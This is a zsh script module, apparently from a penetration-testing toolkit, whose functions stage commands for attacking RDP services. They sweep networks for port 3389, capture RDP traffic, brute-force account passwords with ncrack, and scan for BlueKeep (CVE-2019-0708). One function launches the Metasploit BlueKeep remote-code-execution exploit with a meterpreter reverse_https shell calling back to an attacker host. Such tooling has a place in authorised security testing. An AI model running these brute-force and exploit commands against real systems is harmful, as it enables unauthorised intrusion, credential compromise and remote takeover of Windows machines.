#!/usr/bin/env zsh

#############################################################
# nb-enum-rdp
#############################################################
nb-enum-rdp-help() {
    cat << "DOC" | bat --plain --language=help

nb-enum-rdp
------------
The nb-enum-rdp namespace contains commands for scanning and enumerating RDP remote desktop services.

Commands
--------
nb-enum-rdp-install                  installs dependencies
nb-enum-rdp-nmap-sweep               scan a network for services
nb-enum-rdp-tcpdump                  capture traffic to and from a host
nb-enum-rdp-ncrack                   brute force passwords for a user account
nb-enum-rdp-bluekeep                 bluekeep exploit reference
nb-enum-rdp-msf-bluekeep-scan        bluekeep metasploit scanner
nb-enum-rdp-msf-bluekeep-exploit     bluekeep metasploit exploit

DOC
}

nb-enum-rdp-install() {
    __info "Running $0..."
    __pkgs nmap tcpdump ncrack metasploit-framework
}

nb-enum-rdp-nmap-sweep() {
    __check-project
    nb-vars-set-network
    print -z "grc nmap -n -Pn -sS -p3389 ${__NETWORK} -oA $(__netpath)/rdp-sweep"
}

nb-enum-rdp-tcpdump() {
    __check-project
    nb-vars-set-iface
    nb-vars-set-rhost
    print -z "tcpdump -i ${__IFACE} host ${__RHOST} and tcp port 3389 -w $(__hostpath)/rdp.pcap"
}

nb-enum-rdp-ncrack() {
    __check-project
    nb-vars-set-rhost
    __check-user
    print -z "ncrack -vv --user ${__USER} -P ${__PASSLIST} rdp://${__RHOST} -oN $(__hostpath)/ncrack-rdp.txt "
}

nb-enum-rdp-bluekeep() {
    __info "https://sploitus.com/exploit?id=EDB-ID:47683"
    print -z "searchsploit bluekeep"
}

nb-enum-rdp-msf-bluekeep-scan() {
    __check-project
    nb-vars-set-rhost
    local cmd="use auxiliary/scanner/rdp/cve_2019_0708_bluekeep; set RHOSTS ${__RHOST}; run; exit"
    print -z "msfconsole -n -q -x \" ${cmd} \" | tee $(__hostpath/bluekeep-scan.txt)"
}

nb-enum-rdp-msf-bluekeep-exploit() {
    nb-vars-set-rhost
    nb-vars-set-lhost
    nb-vars-set-lport
    #__warn "Start a handler using on ${__LHOST}:${__LPORT} before proceeding"
    __msf << VAR
use windows/rdp/cve_2019_0708_bluekeep_rce;
set RHOSTS ${__RHOST};
set PAYLOAD windows/x64/meterpreter/reverse_https;
set stagerverifysslcert true;
set HANDLERSSLCERT ${__SHELL_SSL_CERT};
set LHOST ${__LHOST};
set LPORT ${__LPORT};
run;
exit
VAR

}
